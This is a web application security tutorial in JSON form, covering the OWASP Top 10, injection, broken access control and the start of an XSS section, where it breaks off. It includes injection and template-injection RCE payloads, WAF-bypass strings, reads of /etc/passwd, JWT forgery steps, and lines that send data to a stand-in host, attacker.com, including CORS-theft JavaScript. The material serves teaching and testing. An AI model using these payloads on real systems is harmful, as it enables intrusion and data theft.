{
  "id": "advanced-web-app-security-fundamentals",
  "title": "Advanced Web Application Security Fundamentals",
  "description": "Master the core concepts of modern web application security, covering the OWASP Top 10 vulnerabilities, attack vectors, defense strategies, and practical testing methodologies for comprehensive web security assessment.",
  "type": "tutorial",
  "steps": [
    {
      "id": "owasp-top-10-overview",
      "title": "OWASP Top 10 Overview & Risk Assessment",
      "content": "OBJECTIVE: Understand the OWASP Top 10 framework, risk assessment methodology, and how to prioritize web application security testing based on real-world threat patterns.\n\nACADEMIC BACKGROUND:\nThe OWASP Top 10 represents the most critical web application security risks. First published in 2003, it has become the industry standard for web security awareness. The 2021 edition reflects changes in application architecture and API security. Research shows that 90% of web applications have at least one OWASP Top 10 vulnerability.\n\nSTEP-BY-STEP PROCESS:\n\n1. OWASP Top 10 2021 Categories:\n\nA01:2021 - Broken Access Control:\n```text\nIMPACT: Unauthorized access to sensitive data or functions\nEXAMPLES:\n- IDOR (Insecure Direct Object References)\n- Privilege escalation\n- CORS misconfiguration\n- JWT token manipulation\n\nTESTING APPROACH:\n- Test URL parameter manipulation\n- Check role-based access controls\n- Verify API authorization\n- Test JWT token security\n```\n\nA02:2021 - Cryptographic Failures:\n```text\nIMPACT: Exposure of sensitive data\nEXAMPLES:\n- Weak encryption algorithms\n- Improper key management\n- Unencrypted data transmission\n- Weak password storage\n\nTESTING APPROACH:\n- Check SSL/TLS configuration\n- Test password hashing strength\n- Verify encryption in transit/rest\n- Assess key management practices\n```\n\nA03:2021 - Injection:\n```text\nIMPACT: Unauthorized data access or manipulation\nEXAMPLES:\n- SQL injection\n- NoSQL injection\n- Command injection\n- LDAP injection\n\nTESTING APPROACH:\n- Test input sanitization\n- Verify parameterized queries\n- Check for injection in all inputs\n- Test various injection payloads\n```\n\nA04:2021 - Insecure Design:\n```text\nIMPACT: Fundamental security flaws in application design\nEXAMPLES:\n- Missing security controls\n- Improper threat modeling\n- Business logic flaws\n- Lack of secure defaults\n\nTESTING APPROACH:\n- Review application architecture\n- Test business logic flows\n- Check default configurations\n- Assess threat model completeness\n```\n\nA05:2021 - Security Misconfiguration:\n```text\nIMPACT: Accidental exposure of sensitive information\nEXAMPLES:\n- Default credentials\n- Unnecessary services enabled\n- Verbose error messages\n- Misconfigured cloud storage\n\nTESTING APPROACH:\n- Check default installations\n- Test error handling\n- Verify configuration management\n- Assess cloud service permissions\n```\n\nA06:2021 - Vulnerable and Outdated Components:\n```text\nIMPACT: Exploitation of known vulnerabilities\nEXAMPLES:\n- Outdated libraries/frameworks\n- Unpatched software\n- Unsupported components\n- Known CVEs\n\nTESTING APPROACH:\n- Inventory all components\n- Check version against CVEs\n- Test for known vulnerabilities\n- Monitor component updates\n```\n\nA07:2021 - Identification and Authentication Failures:\n```text\nIMPACT: Unauthorized account access\nEXAMPLES:\n- Weak password policies\n- Brute force attacks\n- Session fixation\n- Credential stuffing\n\nTESTING APPROACH:\n- Test password complexity\n- Check session management\n- Verify MFA implementation\n- Assess credential recovery\n```\n\nA08:2021 - Software and Data Integrity Failures:\n```text\nIMPACT: Malicious code execution or data tampering\nEXAMPLES:\n- Insecure deserialization\n- Insufficient integrity checks\n- Supply chain attacks\n- CI/CD pipeline vulnerabilities\n\nTESTING APPROACH:\n- Test serialization security\n- Verify integrity mechanisms\n- Check update mechanisms\n- Assess supply chain security\n```\n\nA09:2021 - Security Logging and Monitoring Failures:\n```text\nIMPACT: Undetected attacks and breaches\nEXAMPLES:\n- Insufficient logging\n- Lack of monitoring\n- Inadequate alerting\n- Log tampering\n\nTESTING APPROACH:\n- Review logging implementation\n- Test monitoring capabilities\n- Check alert mechanisms\n- Verify log integrity\n```\n\nA10:2021 - Server-Side Request Forgery (SSRF):\n```text\nIMPACT: Unauthorized access to internal resources\nEXAMPLES:\n- Internal service access\n- Cloud metadata access\n- Local file inclusion\n- Port scanning\n\nTESTING APPROACH:\n- Test URL input validation\n- Check for localhost access\n- Verify protocol restrictions\n- Test cloud metadata endpoints\n```\n\n2. Risk Assessment Methodology:\n\nCVSS v3.1 Scoring System:\n```text\nBASE METRICS:\n- Attack Vector (AV): Network, Adjacent, Local, Physical\n- Attack Complexity (AC): Low, High\n- Privileges Required (PR): None, Low, High\n- User Interaction (UI): None, Required\n- Scope (S): Unchanged, Changed\n- Confidentiality (C): None, Low, High\n- Integrity (I): None, Low, High\n- Availability (A): None, Low, High\n\nEXAMPLE SCORING:\nSQL Injection: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 9.1 (Critical)\nReflected XSS: AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N = 6.1 (Medium)\n```\n\nBusiness Impact Assessment:\n```text\nFINANCIAL IMPACT:\n- Data breach costs (average $4.45M per incident)\n- Regulatory fines (GDPR: up to 4% of global revenue)\n- Lost business from reputation damage\n- Incident response and recovery costs\n\nOPERATIONAL IMPACT:\n- System downtime and service disruption\n- Customer trust erosion\n- Legal and compliance consequences\n- Resource diversion for remediation\n\nSTRATEGIC IMPACT:\n- Competitive disadvantage\n- Market share loss\n- Insurance premium increases\n- Executive accountability\n```\n\n3. Testing Prioritization Framework:\n\nAsset Valuation:\n```text\nHIGH-VALUE ASSETS:\n1. Customer PII (names, emails, addresses, payment data)\n2. Authentication systems (login, password reset)\n3. Payment processing endpoints\n4. Admin panels and privileged functions\n5. Database connections and queries\n\nMEDIUM-VALUE ASSETS:\n6. User profile management\n7. Content management systems\n8. Public APIs with authentication\n9. File upload functionality\n10. Search and filter features\n\nLOW-VALUE ASSETS:\n11. Static marketing pages\n12. Public documentation\n13. Contact forms\n14. Newsletter subscriptions\n```\n\nThreat Modeling Integration:\n```text\nSTRIDE METHODOLOGY:\n- Spoofing: Authentication attacks\n- Tampering: Data modification attacks\n- Repudiation: Non-repudiation failures\n- Information Disclosure: Privacy breaches\n- Denial of Service: Availability attacks\n- Elevation of Privilege: Authorization bypass\n\nPASTA METHODOLOGY:\n- Define business objectives\n- Define technical scope\n- Decompose application\n- Analyze threats\n- Vulnerability analysis\n```\n\nWHAT TO LOOK FOR:\n- **High-Impact Vulnerabilities**: SQL injection, RCE, authentication bypass\n- **Data Exposure Risks**: Cryptographic failures, access control issues\n- **Business Logic Flaws**: Insecure design, authorization failures\n- **Compliance Requirements**: Industry-specific security standards\n- **Attack Surface Changes**: New features, API additions, third-party integrations\n\nSECURITY IMPLICATIONS:\n- **Risk-Based Security**: Focus testing on high-impact vulnerabilities\n- **Regulatory Compliance**: Meet standards like PCI-DSS, HIPAA, GDPR\n- **Business Protection**: Safeguard revenue-generating functions\n- **Incident Prevention**: Proactively identify and fix critical issues\n\nCOMMON PITFALLS:\n- **Checklist Mentality**: Following OWASP Top 10 without context\n- **Severity Inflation**: Overstating impact for higher bounties\n- **Scope Creep**: Testing out-of-scope functionality\n- **Missing Context**: Not understanding business criticality\n- **False Negatives**: Missing custom vulnerabilities not in Top 10\n\nTOOLS REFERENCE:\n- **OWASP Top 10**: https://owasp.org/www-project-top-ten/\n- **CVSS Calculator**: https://www.first.org/cvss/calculator/3.1\n- **NIST Vulnerability Database**: https://nvd.nist.gov/\n- **MITRE ATT&CK**: https://attack.mitre.org/\n- **STRIDE Threat Model**: https://docs.microsoft.com/en-us/previous-versions/commerce-server/ee823878(v=cs.20)\n\nFURTHER READING:\n- OWASP Top 10 2021: https://owasp.org/www-report/OWASP_Top_Ten/\n- Web Application Security Testing: https://owasp.org/www-project-web-security-testing-guide/\n- Threat Modeling: https://owasp.org/www-community/Threat_Modeling\n- Risk Assessment: https://csrc.nist.gov/publications/detail/sp/800-30/rev-1/final",
      "tags": ["owasp", "web-security", "risk-assessment", "vulnerability-management"]
    },
    {
      "id": "injection-attacks-deep-dive",
      "title": "Injection Attacks: SQL, NoSQL, Command Injection",
      "content": "OBJECTIVE: Master injection attack techniques, understand root causes, and learn comprehensive prevention strategies for the most destructive web application vulnerabilities.\n\nACADEMIC BACKGROUND:\nInjection attacks have topped the OWASP Top 10 for years due to their prevalence and impact. SQL injection alone costs businesses millions annually. The 2021 OWASP update emphasizes that injection flaws are still the #3 most critical web application security risk. Understanding injection requires knowledge of interpreters, parsers, and data sanitization.\n\nSTEP-BY-STEP PROCESS:\n\n1. SQL Injection Fundamentals:\n\nUnderstanding SQL Injection:\n```sql\n-- Basic SELECT query\nSELECT * FROM users WHERE id = '$id'\n\n-- Vulnerable PHP code\n$id = $_GET['id'];\n$query = \"SELECT * FROM users WHERE id = '$id'\";\n\n-- Attacker input: 1' OR '1'='1\n-- Resulting query: SELECT * FROM users WHERE id = '1' OR '1'='1'\n-- Returns all users (authentication bypass)\n```\n\nSQL Injection Types:\n```text\nCLASSIC SQL INJECTION:\n- Tautology attacks: ' OR '1'='1\n- Union-based: UNION SELECT username,password FROM users\n- Error-based: ' AND 1=convert(int,(select top 1 name from sysobjects))\n- Blind boolean: AND (SELECT COUNT(*) FROM users) > 0\n- Blind time-based: AND IF(1=1, SLEEP(5), 0)\n\nSECOND-ORDER INJECTION:\n- Input stored, executed later\n- Example: Username stored, used in dynamic query later\n\nOUT-OF-BAND INJECTION:\n- Data exfiltrated via DNS, HTTP requests\n- Useful when direct response not visible\n```\n\nAdvanced SQL Injection:\n```sql\n-- Stacked queries (multiple statements)\n1'; DROP TABLE users; --\n\n-- Time-based blind injection with heavy queries\nAND (SELECT COUNT(*) FROM information_schema.tables) > 0\n\n-- DNS exfiltration\nAND LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\\\abc'))\n\n-- WAF bypass with encoding\n%27%20OR%20%271%27%3D%271  (URL encoded)\nEXEC('SEL'+'ECT * FROM users')  (concatenation)\n```\n\n2. NoSQL Injection:\n\nMongoDB Injection:\n```javascript\n// Vulnerable Node.js code\nUser.find({username: req.body.username, password: req.body.password})\n\n// Attacker input: { \"$gt\": \"\" }\n// Becomes: User.find({username: {\"$gt\": \"\"}, password: {\"$gt\": \"\"}})\n// Matches all documents (authentication bypass)\n\n// Alternative attack\nusername: {\"$ne\": null}\npassword: {\"$ne\": null}\n```\n\nNoSQL Injection Techniques:\n```javascript\n// JavaScript injection in MongoDB\n{$where: \"this.username == 'admin' || this.password.length < 10\"}\n\n// Regex injection\nusername: /^admin.*$/\n\n// Operator injection\n{\"$or\": [{\"username\": \"admin\"}, {\"username\": {\"$ne\": \"admin\"}}]}\n\n// Array injection\n{\"username\": {\"$in\": [\"admin\", \"root\", \"administrator\"]}}\n```\n\n3. Command Injection:\n\nOS Command Injection:\n```php\n// Vulnerable PHP code\n$domain = $_GET['domain'];\nsystem(\"nslookup \" . $domain);\n\n// Attacker input: ; cat /etc/passwd\n// Result: nslookup ; cat /etc/passwd\n// Executes command injection\n```\n\nCommand Injection Variants:\n```bash\n# Semicolon separation\n; cat /etc/passwd\n\n# Pipe chaining\n| cat /etc/passwd\n\n# Command substitution\n$(cat /etc/passwd)\n\n# Backtick execution\n`cat /etc/passwd`\n\n# Logical operators\n&& cat /etc/passwd\n|| cat /etc/passwd\n```\n\nAdvanced Command Injection:\n```bash\n# WAF bypass techniques\nc\\\\at /etc/passwd  (backslash escaping)\nca''t /etc/passwd  (quote breaking)\n\n# Windows command injection\n| type C:\\boot.ini\n\n# PowerShell injection\n; powershell -c \"Get-Content C:\\secret.txt\"\n\n# Blind command injection\n; ping -c 1 attacker.com  (DNS exfiltration)\n; sleep 10  (time-based)\n```\n\n4. Template Injection (SSTI):\n\nServer-Side Template Injection:\n```python\n# Vulnerable Flask/Jinja2\n@app.route('/user/<username>')\ndef user_profile(username):\n    template = f\"<h1>Hello {username}</h1>\"\n    return render_template_string(template)\n\n# Attacker input: {{7*7}}\n# Renders: <h1>Hello 49</h1>\n\n# RCE payload: {{self.__class__.__mro__[1].__subclasses__()}}\n# Can execute arbitrary Python code\n```\n\nTemplate Engine Vulnerabilities:\n```text\nJINJA2 (Python):\n{{self.__class__.__mro__[1].__subclasses__()}}\n{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n\nTWIG (PHP):\n{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}\n\nFREEMARKER (Java):\n<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"id\")}\n\nHANDLEBARS (JavaScript):\n{{#with \"s\" as |string|}}\n  {{#with \"e\"}}\n    {{#with split as |conslist|}}\n      {{this.pop}}\n      {{this.push (lookup string.sub \"constructor\")}}\n      {{this.pop}}\n      {{#with string.split as |codelist|}}\n        {{this.pop}}\n        {{this.push \"return require('child_process').execSync('id');\"}}\n        {{this.pop}}\n        {{#each conslist}}\n          {{#with (string.sub.apply 0 codelist)}}\n            {{this}}\n          {{/with}}\n        {{/each}}\n      {{/with}}\n    {{/with}}\n  {{/with}}\n{{/with}}\n```\n\n5. Prevention Strategies:\n\nInput Validation and Sanitization:\n```php\n// PHP prepared statements\n$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');\n$stmt->execute([$id]);\n\n// Parameterized queries\n$query = \"SELECT * FROM users WHERE id = :id\";\n$stmt = $pdo->prepare($query);\n$stmt->bindParam(':id', $id, PDO::PARAM_INT);\n\n// Input validation\nif (!is_numeric($id)) {\n    die(\"Invalid ID\");\n}\n```\n\nOutput Encoding:\n```javascript\n// Client-side encoding\nconst safeHTML = DOMPurify.sanitize(userInput);\nelement.innerHTML = safeHTML;\n\n// Server-side encoding\napp.use(express.urlencoded({ extended: true }));\nconst encoded = encodeURIComponent(userInput);\n```\n\nWeb Application Firewall (WAF):\n```text\nMODSECURITY RULES:\nSecRule ARGS \"@rx \\\\bunion\\\\b.*\\\\bselect\\\\b\" \"id:12345,deny\"\n\nCLOUDFLARE WAF:\n- SQL injection detection\n- XSS prevention\n- Command injection blocking\n\nWAF BYPASS TECHNIQUES:\n- Case variation: UnIoN SeLeCt\n- Encoding: %55%6e%49%6f%6e (URL encoding)\n- Comments: UNI/*comment*/ON SELECT\n- Whitespace: UNION    SELECT\n```\n\nStored Procedures and ORM:\n```python\n# SQLAlchemy ORM\nusers = session.query(User).filter(User.id == user_id).all()\n\n# Django ORM\nusers = User.objects.filter(id=user_id)\n\n# Stored procedure\nCREATE PROCEDURE GetUser(@UserId INT)\nAS\nBEGIN\n    SELECT * FROM Users WHERE Id = @UserId\nEND\n```\n\n6. Testing Methodology:\n\nAutomated Testing:\n```bash\n# SQLMap for SQL injection\ntarget=\"https://example.com/user?id=1\"\nsqlmap -u \"$target\" --batch --dbs\n\n# NoSQLMap for NoSQL injection\npython nosqlmap.py -t https://example.com\n\n# Commix for command injection\ncommix -u \"https://example.com/cmd?cmd=ls\" --batch\n```\n\nManual Testing Techniques:\n```text\nSQL INJECTION PAYLOADS:\n' OR '1'='1\n\" OR \"1\"=\"1\n') OR ('1'='1\n\")) OR ((\"1\"=\"1\n\nUNION-BASED:\nORDER BY 1--\nUNION SELECT 1,2,3--\nUNION SELECT username,password FROM users--\n\nTIME-BASED BLIND:\nAND IF(1=1, SLEEP(5), 0)\nAND (SELECT * FROM (SELECT(SLEEP(5)))a)\n\nERROR-BASED:\nAND 1=convert(int,(select top 1 name from sysobjects))\nAND 1=cast((select top 1 name from sysobjects) as int)\n```\n\n7. Advanced Evasion Techniques:\n\nWAF Bypass Methods:\n```text\nENCODING TECHNIQUES:\n- URL encoding: %27%20OR%20%271%27%3D%271\n- Double encoding: %2527%2520OR%2520%25271%2527%253D%25271\n- Unicode encoding: %u0027 OR %u00271%u0027=%u00271\n\nOBFUSCATION:\n- Inline comments: UNI/*!UNION*/ON SEL/*!ECT*/ECT\n- Case variation: UniOn SeLeCt\n- Whitespace manipulation: UNION%0D%0ASELECT\n- Hex encoding: 0x53454c454354\n\nALTERNATIVE SYNTAX:\n- EXEC('SEL'+'ECT * FROM users')\n- Using system tables: information_schema.tables\n- Subquery injection: (SELECT * FROM users)\n```\n\nWHAT TO LOOK FOR:\n- **Database Errors**: SQL syntax errors indicating injection points\n- **Unexpected Results**: Queries returning more data than expected\n- **Time Delays**: Blind injection timing differences\n- **DNS Requests**: Out-of-band data exfiltration\n- **Command Output**: Unexpected system command execution\n- **Template Errors**: Template parsing errors revealing injection\n- **WAF Alerts**: Web application firewall triggering\n\nSECURITY IMPLICATIONS:\n- **Data Breach**: Complete database compromise and data exfiltration\n- **System Compromise**: Command injection leading to server takeover\n- **Application Defacement**: Template injection for content modification\n- **Denial of Service**: Resource exhaustion through injection attacks\n- **Privilege Escalation**: Database user privilege abuse\n\nCOMMON PITFALLS:\n- **False Positives**: Legitimate input triggering injection detection\n- **WAF Bypass**: Modern WAFs block obvious payloads but miss obfuscated ones\n- **Second-Order Injection**: Input stored and executed later, harder to detect\n- **NoSQL Assumptions**: Different injection techniques for document databases\n- **Template Complexity**: Various template engines have different injection methods\n- **Encoding Issues**: Input encoding can bypass validation but not execution\n- **Stored Procedures**: Not always safe, can still be vulnerable to injection\n\nTOOLS REFERENCE:\n- **SQLMap**: https://sqlmap.org/ (Automated SQL injection)\n- **NoSQLMap**: https://github.com/codingo/NoSQLMap (NoSQL injection)\n- **Commix**: https://github.com/commixproject/commix (Command injection)\n- **Tplmap**: https://github.com/epinna/tplmap (Template injection)\n- **Burp Suite**: https://portswigger.net/burp (Manual testing)\n- **OWASP ZAP**: https://www.zaproxy.org/ (Automated scanning)\n\nFURTHER READING:\n- SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection\n- NoSQL Injection: https://owasp.org/www-project-nosql-injection/\n- Command Injection: https://owasp.org/www-community/attacks/Command_Injection\n- Template Injection: https://owasp.org/www-community/attacks/Server-Side_Template_Injection\n- Injection Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html\n- Advanced SQL Injection: https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/",
      "tags": ["injection", "sql-injection", "nosql-injection", "command-injection", "ssti"]
    },
    {
      "id": "broken-access-control",
      "title": "Broken Access Control & Authorization Bypass",
      "content": "OBJECTIVE: Understand access control mechanisms, identify authorization flaws, and master techniques for testing and exploiting broken access control vulnerabilities.\n\nACADEMIC BACKGROUND:\nBroken access control moved from #5 to #1 in the OWASP Top 10 2021, reflecting its critical impact. Research shows that 74% of applications have access control vulnerabilities. Understanding access control requires knowledge of authentication, authorization, session management, and business logic.\n\nSTEP-BY-STEP PROCESS:\n\n1. Access Control Fundamentals:\n\nAuthentication vs Authorization:\n```text\nAUTHENTICATION: Proves user identity\n- Username/password\n- Multi-factor authentication\n- Biometric verification\n- Certificate-based auth\n\nAUTHORIZATION: Grants permissions after authentication\n- Role-based access control (RBAC)\n- Attribute-based access control (ABAC)\n- Access control lists (ACLs)\n- Capability-based security\n```\n\nCommon Access Control Models:\n```text\nROLE-BASED ACCESS CONTROL (RBAC):\n- Users assigned to roles\n- Roles granted permissions\n- Hierarchical role structure\n- Example: user < moderator < admin\n\nATTRIBUTE-BASED ACCESS CONTROL (ABAC):\n- Policies based on attributes\n- User attributes, resource attributes, environment\n- Fine-grained control\n- Example: Allow access if department=finance AND time=9-5\n\nMANDATORY ACCESS CONTROL (MAC):\n- System-enforced policies\n- Security labels and clearances\n- Military/government use\n- Example: Top Secret > Secret > Confidential\n```\n\n2. Broken Access Control Vulnerabilities:\n\nInsecure Direct Object References (IDOR):\n```text\nVULNERABILITY: Direct access to objects by ID without authorization check\n\nEXAMPLE URLS:\nhttps://example.com/user/123/profile  (Your profile)\nhttps://example.com/user/124/profile  (Someone else's profile)\n\nVULNERABLE CODE:\n$user_id = $_GET['id'];\n$query = \"SELECT * FROM users WHERE id = $user_id\";  // No ownership check\n\nSECURE CODE:\n$user_id = $_GET['id'];\nif ($user_id != $_SESSION['user_id'] && !is_admin()) {\n    die(\"Access denied\");\n}\n$query = \"SELECT * FROM users WHERE id = $user_id\";\n```\n\nIDOR Testing Methodology:\n```bash\n# Numeric ID manipulation\ncurl https://api.example.com/users/123  # Your ID\ncurl https://api.example.com/users/124  # Test other IDs\n\n# UUID manipulation\ncurl https://api.example.com/users/550e8400-e29b-41d4-a716-446655440000\ncurl https://api.example.com/users/550e8400-e29b-41d4-a716-446655440001\n\n# Parameter-based IDOR\ncurl \"https://example.com/download?file=report.pdf&user_id=123\"\ncurl \"https://example.com/download?file=report.pdf&user_id=124\"\n\n# JSON parameter manipulation\ncurl -X POST https://api.example.com/get-data \\\n  -d '{\"user_id\": 123}'  # Your data\ncurl -X POST https://api.example.com/get-data \\\n  -d '{\"user_id\": 124}'  # Someone else's data\n```\n\nPrivilege Escalation:\n```text\nVERTICAL PRIVILEGE ESCALATION:\n- Lower privilege user gains higher privilege access\n- Example: Regular user becomes admin\n\nHORIZONTAL PRIVILEGE ESCALATION:\n- User gains access to another user's resources at same privilege level\n- Example: User A accesses User B's data\n\nBUSINESS LOGIC PRIVILEGE ESCALATION:\n- Exploiting application logic flaws\n- Example: Manipulating workflow to gain unauthorized access\n```\n\nPrivilege Escalation Testing:\n```bash\n# Role manipulation in requests\ncurl -X POST https://api.example.com/update-role \\\n  -d '{\"user_id\": 123, \"role\": \"admin\"}'\n\n# Parameter tampering\ncurl \"https://example.com/admin/users?role=user\"\ncurl \"https://example.com/admin/users?role=admin\"\n\n# Cookie manipulation\n# Change role cookie from 'user' to 'admin'\n\n# JWT token manipulation\n# Decode JWT, change role, re-sign with known key\n# {\"user\": \"john\", \"role\": \"user\"} -> {\"user\": \"john\", \"role\": \"admin\"}\n```\n\n3. Mass Assignment Vulnerabilities:\n\nMass Assignment Concept:\n```text\nVULNERABILITY: Framework automatically binds all request parameters to object\n\nVULNERABLE CODE (Ruby on Rails):\nuser = User.new(params[:user])  # Binds ALL parameters\nuser.save\n\nATTACK PAYLOAD:\nPOST /users\n{\n  \"name\": \"Attacker\",\n  \"email\": \"attacker@example.com\",\n  \"is_admin\": true,     // Unauthorized parameter\n  \"balance\": 1000000    // Unauthorized parameter\n}\n\nSECURE CODE:\nuser = User.new(params.require(:user).permit(:name, :email))\nuser.save\n```\n\nMass Assignment Testing:\n```bash\n# Test all object creation endpoints\ncurl -X POST https://api.example.com/users \\\n  -d '{\"name\": \"Test\", \"email\": \"test@test.com\", \"is_admin\": true}'\n\n# Test update endpoints\ncurl -X PUT https://api.example.com/users/123 \\\n  -d '{\"name\": \"Updated\", \"role\": \"admin\", \"balance\": 999999}'\n\n# Check for unexpected parameter acceptance\n# Monitor response for successful parameter binding\n```\n\n4. CORS Misconfiguration:\n\nCross-Origin Resource Sharing (CORS):\n```text\nCORS PURPOSE: Control cross-origin requests from browsers\n\nVULNERABLE CONFIGURATION:\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n\nSECURE CONFIGURATION:\nAccess-Control-Allow-Origin: https://trusted-domain.com\nAccess-Control-Allow-Credentials: true\nAccess-Control-Allow-Methods: GET, POST\nAccess-Control-Allow-Headers: Authorization, Content-Type\n```\n\nCORS Exploitation:\n```javascript\n// Attacker's malicious website\nvar xhr = new XMLHttpRequest();\nxhr.open('GET', 'https://victim.com/api/user/data');\nxhr.withCredentials = true;\nxhr.onload = function() {\n    // Send stolen data to attacker\n    fetch('https://attacker.com/steal?data=' + xhr.responseText);\n};\nxhr.send();\n```\n\nCORS Testing:\n```bash\n# Test preflight requests\ncurl -X OPTIONS https://api.example.com/users \\\n  -H \"Origin: https://evil.com\" \\\n  -H \"Access-Control-Request-Method: GET\" \\\n  -v\n\n# Check ACAO header\ncurl -I https://api.example.com/users \\\n  -H \"Origin: https://evil.com\"\n\n# Test credentials with wildcard\n# ACAO: * with ACAC: true is dangerous\n```\n\n5. JWT Token Vulnerabilities:\n\nJSON Web Token Structure:\n```text\nJWT FORMAT: header.payload.signature\n\nHEADER: {\"alg\": \"HS256\", \"typ\": \"JWT\"}\nPAYLOAD: {\"user_id\": 123, \"role\": \"user\", \"exp\": 1640995200}\nSIGNATURE: HMACSHA256(base64(header) + \".\" + base64(payload), secret)\n\nCOMMON VULNERABILITIES:\n- None algorithm: {\"alg\": \"none\"}\n- Weak secrets: \"secret\" or default keys\n- Algorithm confusion: HS256 vs RS256\n- Expiration bypass: Remove exp claim\n- Signature bypass: Accept unsigned tokens\n```\n\nJWT Attack Techniques:\n```bash\n# Algorithm confusion attack\n# Change HS256 to RS256, sign with public key as secret\nheader = {\"alg\": \"RS256\", \"typ\": \"JWT\"}\npayload = {\"user\": \"admin\", \"role\": \"admin\"}\nsignature = sign_with_public_key(header + \".\" + payload)\n\n# None algorithm attack\nheader = {\"alg\": \"none\", \"typ\": \"JWT\"}\npayload = {\"user\": \"admin\", \"role\": \"admin\"}\nsignature = \"\"\n\n# Weak secret brute force\njohn jwt_token.txt --wordlist=rockyou.txt\n\n# JWK header injection\n# Inject malicious JWK Set in header\n```\n\n6. Session Management Issues:\n\nSession Fixation:\n```text\nATTACK FLOW:\n1. Attacker gets session ID: https://example.com/?session_id=abc123\n2. Tricks victim into using same session ID\n3. Victim authenticates, attacker hijacks session\n\nPREVENTION:\n- Regenerate session ID after login\n- Use secure session cookies\n- Implement session timeout\n```\n\nSession Hijacking Testing:\n```bash\n# Test session fixation\n# 1. Get session ID from unauthenticated page\n# 2. Log in with that session ID\n# 3. Check if session persists\n\n# Test session timeout\n# Leave session idle, check if still valid\n\n# Test concurrent sessions\n# Log in from multiple browsers/devices\n# Check if one logout affects others\n```\n\n7. Business Logic Flaws:\n\nWorkflow Bypass:\n```text\nEXAMPLE: E-commerce discount manipulation\n\nLEGITIMATE FLOW:\n1. Add item to cart\n2. Apply coupon code\n3. Checkout with discount\n\nATTACK:\n1. Add item to cart\n2. Go directly to checkout\n3. Modify POST data to include discount\n4. Complete purchase with unauthorized discount\n```\n\nBusiness Logic Testing:\n```bash\n# Test workflow steps\n# Try skipping steps, going backwards, repeating steps\n\n# Parameter manipulation\n# Change quantities, prices, discount codes in requests\n\n# Race conditions\n# Concurrent requests that manipulate shared state\n\n# State manipulation\n# Change hidden form fields, cookies, local storage\n```\n\n8. Prevention Strategies:\n\nDefense in Depth:\n```text\nACCESS CONTROL LAYER:\n- Check authorization on every request\n- Use centralized authorization service\n- Implement principle of least privilege\n\nINPUT VALIDATION:\n- Validate all user input\n- Use allowlists for parameters\n- Implement proper type checking\n\nSESSION SECURITY:\n- Regenerate session IDs\n- Implement secure cookies\n- Use short session timeouts\n- Monitor for suspicious activity\n```\n\nSecure Coding Practices:\n```python\n# Flask authorization decorator\n@app.route('/admin')\n@login_required\ndef admin_panel():\n    if not current_user.is_admin:\n        abort(403)\n    return render_template('admin.html')\n\n# Object-level authorization\ndef get_user_data(user_id):\n    user = User.query.get_or_404(user_id)\n    if user.id != current_user.id and not current_user.is_admin:\n        abort(403)\n    return user.data\n```\n\nWHAT TO LOOK FOR:\n- **IDOR Patterns**: Direct object references without ownership checks\n- **Privilege Escalation**: Users gaining unauthorized permissions\n- **Mass Assignment**: Unexpected parameters accepted in object creation\n- **CORS Issues**: Overly permissive cross-origin policies\n- **JWT Flaws**: Weak secrets, algorithm confusion, signature bypass\n- **Session Problems**: Fixation, weak timeouts, concurrent session issues\n- **Business Logic**: Workflow bypass, parameter manipulation, race conditions\n\nSECURITY IMPLICATIONS:\n- **Data Breach**: Unauthorized access to sensitive user information\n- **Account Takeover**: Complete control of user accounts and sessions\n- **Privilege Abuse**: Administrative access leading to system compromise\n- **Financial Loss**: Manipulation of payments, balances, or transactions\n- **Privacy Violation**: Access to personal data without consent\n\nCOMMON PITFALLS:\n- **Inconsistent Checks**: Authorization enforced in some places but not others\n- **Client-Side Reliance**: Trusting client-side access control mechanisms\n- **Parameter Hiding**: Assuming hidden fields provide security\n- **Role Confusion**: Misunderstanding the difference between authentication and authorization\n- **Business Logic Assumptions**: Not testing edge cases in application workflows\n- **Session Management**: Weak session handling leading to fixation or hijacking\n- **CORS Complexity**: Misunderstanding CORS preflight and actual request handling\n\nTOOLS REFERENCE:\n- **Burp Suite**: https://portswigger.net/burp (Authorization testing)\n- **Authz0**: https://github.com/CyberSecurityUP/Authz0 (Broken access control scanner)\n- **JWT Tool**: https://github.com/ticarpi/jwt_tool (JWT testing)\n- **CORS Scanner**: https://github.com/chenjj/CORScanner (CORS misconfiguration)\n- **OWASP ZAP**: https://www.zaproxy.org/ (Access control testing)\n\nFURTHER READING:\n- OWASP Access Control: https://owasp.org/www-community/Broken_Access_Control\n- IDOR Vulnerabilities: https://owasp.org/www-community/attacks/Insecure_Direct_Object_References\n- JWT Security: https://tools.ietf.org/html/rfc8725\n- CORS Security: https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny\n- Session Management: https://owasp.org/www-community/attacks/Session_Management\n- Business Logic Flaws: https://owasp.org/www-community/attacks/Business_Logic_Attacks",
      "tags": ["access-control", "authorization", "idor", "privilege-escalation", "cors", "jwt"]
    },
    {
      "id": "xss-prevention-defense",
      "title": "Cross-Site Scripting (XSS) Exploitation and Prevention",
      "content": "OBJECTIVE: Master XSS attack techniques, understand browser security mechanisms, and implement comprehensive prevention strategies for client-side injection vulnerabilities.\n\nACADEMIC BACKGROUND:\nXSS has been in the OWASP Top 10 since its inception, though it moved down in 2021 due to better browser protections. However, it remains prevalent with sophisticated bypass techniques. Understanding XSS requires knowledge of HTML, JavaScript, browser security models, and Content Security Policy (CSP).\n\nSTEP-BY-STEP PROCESS:\n\n1. XSS Fundamentals:\n\nCross-Site Scripting Types:\n```text\nREFLECTED XSS:\n- Input reflected immediately in response\n- Requires user to click malicious link\n- Example: Search parameter echoed in results\n\nSTORED XSS:\n- Input stored in database, displayed to users\n- Persistent across sessions\n- Example: Comment system, user profiles\n\nDOM-BASED XSS:\n- JavaScript modifies DOM with user input\n- Client-side vulnerability\n- Example: document.location.hash manipulation\n```\n\nBasic XSS Payloads:\n```html\n<!-- Basic alert 